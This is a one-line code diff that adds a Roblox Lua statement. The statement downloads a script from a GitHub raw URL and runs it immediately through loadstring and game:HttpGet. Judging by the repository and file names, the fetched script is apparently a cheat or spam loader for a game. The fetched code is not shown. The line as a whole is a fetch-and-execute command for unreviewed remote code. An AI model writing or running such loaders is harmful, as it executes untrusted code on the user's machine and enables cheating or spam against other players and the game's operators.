@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/worldfront-spam3-xgh2gdz4mcgsjf.lua"))()
